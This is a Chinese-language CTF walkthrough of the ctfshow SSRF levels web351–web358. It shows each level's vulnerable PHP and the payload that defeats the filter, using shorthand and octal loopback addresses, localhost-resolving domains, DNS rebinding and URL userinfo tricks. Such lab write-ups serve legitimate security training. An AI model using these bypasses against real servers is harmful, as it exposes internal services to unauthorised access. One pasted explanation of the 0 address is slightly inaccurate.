## ctfshow----ssrf

[TOC]

### 尝试



**缺省模式：**127.0.0.1写成127.1
CIDR：url=http://127.127.127.127/flag.php
url=http://0/flag.php

> *0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0*

url=http://0.0.0.0/flag.php

> 在IP地址中，`127.0.0.1`通常表示本地回环地址，即“localhost”。在某些情况下，尤其是在简化输入时，`127.0.0.1`可以被缩写为`127.1`，这是因为在IP地址解析时，缺少的部分会自动填充为0。
>
> **关于CIDR和URL:**
>
> - `url=http://127.127.127.127/flag.php`：这是一个普通的IPv4地址，没有特别的CIDR表示法。
> - `url=http://0/flag.php` 和 `url=http://0.0.0.0/flag.php`：`0.0.0.0` 通常表示一个非特定的地址，或表示所有的网络接口。在URL中使用 `0` 是一种极端简写，类似于 `http://127.0.0.0/flag.php`，但在很多情况下，`0.0.0.0`不会被用于实际的HTTP请求，因为它没有明确的目标主机。



### web351

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($phpurl);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
```

没有过滤，Payload：Post传参

```
url=127.0.0.1/flag.php

ctfshow{7139477e-1393-443c-b7aa-2f972c33d856}
```



### web352

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127.0.0/')){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

对`parse_url()`的了解

#### **`$x = parse_url($url);`**

- `parse_url()` 是PHP内置的函数，它会解析一个URL并将其分解成不同的组成部分（例如协议、主机名、端口、路径等）。

- 解析后的结果是一个关联数组（

  ```
  $x
  ```

  ），其中包含了URL的各个部分。例如：

  ```php
  $x = parse_url('https://www.example.com:8080/path?arg=value#anchor');
  ```

  `$x` 将包含：

  ```php
  [
      'scheme' => 'https',
      'host' => 'www.example.com',
      'port' => 8080,
      'path' => '/path',
      'query' => 'arg=value',
      'fragment' => 'anchor'
  ]
  ```

Payload:

```
url=http://0177.000.000.001/flag.php
```



### web353

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

Payload:

```
url=http://0177.000.000.001/flag.php
```



### web354

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|1|0|。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

这里可以采用别的域名DNS解析到`127.0.0.1`

1. `ssrf.bx33661.com`(这个我自己设置的)
2. `http://sudo.cc`这个域名就是指向127.0.0.1

Payload：

```http
url=http://sudo.cc/flag.php
```



### web355

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=5)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

Payload:

```
url=http://127.1/flag.php
```



### web356

> 题目要求[host]长度不超过3

Payload：

```
url=http://0/flag.php
```





### web357

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$ip = gethostbyname($x['host']);
echo '</br>'.$ip.'</br>';
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('ip!');
}


echo file_get_contents($_POST['url']);
}
else{
    die('scheme');
}
?> scheme
```

这个主要是这段话，限制ip

```php
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('ip!');
}
```

> 这段PHP代码用于验证一个IP地址，并且对其进行过滤，确保该IP地址不是属于私有IP范围或保留IP范围。如果IP地址不符合要求，脚本会终止执行，并输出 `'ip!'`。
>
> ### 代码分析：
>
> ```
> php复制代码if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
>     die('ip!');
> }
> ```
>
> - **`filter_var($ip, FILTER_VALIDATE_IP)`**:
>
>   - 这是PHP中的一个内置函数，用于验证 `$ip` 是否是一个有效的IP地址。它会返回`true`或`false`。
>   - 如果 `$ip` 是有效的IP地址，`filter_var` 将返回`true`，否则返回`false`。
>
> - **`FILTER_FLAG_NO_PRIV_RANGE`**:
>
>   - 这个标志用于确保IP地址不在私有IP范围内。如果IP地址在以下私有IP范围内，则
>
>     ```
>     filter_var
>     ```
>
>     函数会返回
>
>     ```
>     false
>     ```
>
>     ：
>
>     - 10.0.0.0 到 10.255.255.255
>     - 172.16.0.0 到 172.31.255.255
>     - 192.168.0.0 到 192.168.255.255
>
> - **`FILTER_FLAG_NO_RES_RANGE`**:
>
>   - 这个标志用于确保IP地址不在保留地址范围内。保留地址通常指的是像多播地址（224.0.0.0 到 239.255.255.255）和`0.0.0.0`或`255.255.255.255`这些特殊用途的地址。
>
> - **逻辑运算符`|`**:
>
>   - 这是按位或操作符，用于组合两个标志。组合后的标志会同时验证IP地址是否在私有范围和保留范围。
>
> - **`die('ip!')`**:
>
>   - 如果 `filter_var` 函数返回`false`（即IP地址不符合验证标准），脚本会立即停止执行，并输出`'ip!'`。
>
> **总之**
>
> 这段代码的功能是：
>
> - 接受一个IP地址，并验证它是否是一个有效的、非私有且非保留的IP地址。
> - 如果该IP地址不符合这些条件，则终止脚本执行并显示 `'ip!'`。
>
> 这种验证方法常用于需要确保外部请求IP地址合法性的场景，例如防止访问来自本地网络或保留地址的请求。

采用**DNS rebinding（DNS重新绑定攻击）**

这里是用https://lock.cmpxchg8b.com/rebinder.html

![image-20240830140630173](https://gitee.com/bx33661/image/raw/master/path/image-20240830140630173.png)

Payload:

![image-20240830142235036](https://gitee.com/bx33661/image/raw/master/path/image-20240830142235036.png)

```
url=http://0886ce69.7f000001.rbndr.us/flag.php
```





### web358

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```

要满足匹配规则

```
payload:
url=http://ctf.@127.0.0.1/flag.php#show
```

![image-20240830142903100](https://gitee.com/bx33661/image/raw/master/path/image-20240830142903100.png)
